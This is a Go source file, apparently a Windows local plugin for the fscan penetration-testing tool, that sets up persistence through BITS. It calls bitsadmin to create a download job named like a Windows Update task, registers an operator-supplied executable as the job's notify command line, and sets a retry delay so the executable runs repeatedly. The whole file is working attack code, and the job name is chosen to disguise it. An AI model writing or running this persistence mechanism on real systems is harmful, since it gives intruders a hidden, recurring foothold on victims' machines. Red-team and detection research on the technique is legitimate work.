//go:build (plugin_winbits || !plugin_selective) && windows && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

type WinBITSPlugin struct {
	plugins.BasePlugin
}

func NewWinBITSPlugin() *WinBITSPlugin {
	return &WinBITSPlugin{BasePlugin: plugins.NewBasePlugin("winbits")}
}

func (p *WinBITSPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	pePath := session.Config.WinPEFile
	if pePath == "" {
		return &plugins.Result{Success: false, Error: 		fmt.Errorf(i18n.GetText("local_pe_not_specified"))}
	}
	if _, err := os.Stat(pePath); err != nil {
		return &plugins.Result{Success: false, Error: 		fmt.Errorf(i18n.Tr("local_pe_not_found", pePath))}
	}

	absPath, _ := filepath.Abs(pePath)
	baseName := strings.TrimSuffix(filepath.Base(absPath), filepath.Ext(absPath))
	jobName := fmt.Sprintf("WindowsUpdate_%s", baseName)

	var output strings.Builder

	// 创建任务并提取 GUID
	out, err := exec.Command("bitsadmin", "/create", "/download", jobName).CombinedOutput()
	if err != nil {
		output.WriteString(fmt.Sprintf("[失败] 创建任务: %s\n", strings.TrimSpace(string(out))))
		return &plugins.Result{Success: false, Output: output.String()}
	}

	guid := ""
	for _, line := range strings.Split(string(out), "\n") {
		if idx := strings.Index(line, "{"); idx != -1 {
			if end := strings.Index(line[idx:], "}"); end != -1 {
				guid = line[idx : idx+end+1]
				break
			}
		}
	}
	if guid == "" {
		output.WriteString("[失败] 无法提取任务 GUID\n")
		return &plugins.Result{Success: false, Output: output.String()}
	}
	output.WriteString(fmt.Sprintf("[成功] 创建任务: %s (%s)\n", jobName, guid))

	steps := []struct {
		desc string
		args []string
	}{
		{"添加文件", []string{"/addfile", guid, "http://localhost/update", fmt.Sprintf(`%s\%s_tmp`, os.TempDir(), baseName)}},
		{"设置回调", []string{"/SetNotifyCmdLine", guid, absPath, "NUL"}},
		{"设置重试", []string{"/SetMinRetryDelay", guid, "60"}},
		{"恢复任务", []string{"/resume", guid}},
	}

	successCount := 1
	for _, step := range steps {
		out, err := exec.Command("bitsadmin", step.args...).CombinedOutput()
		if err != nil {
			output.WriteString(fmt.Sprintf("[失败] %s: %s\n", step.desc, strings.TrimSpace(string(out))))
			continue
		}
		output.WriteString(fmt.Sprintf("[成功] %s\n", step.desc))
		successCount++
	}

	if successCount >= 3 {
		common.LogSuccess(i18n.Tr("winbits_success", jobName))
	}

	return &plugins.Result{
		Success: successCount >= 3,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
	}
}

func init() {
	RegisterLocalPlugin("winbits", func() Plugin {
		return NewWinBITSPlugin()
	})
}
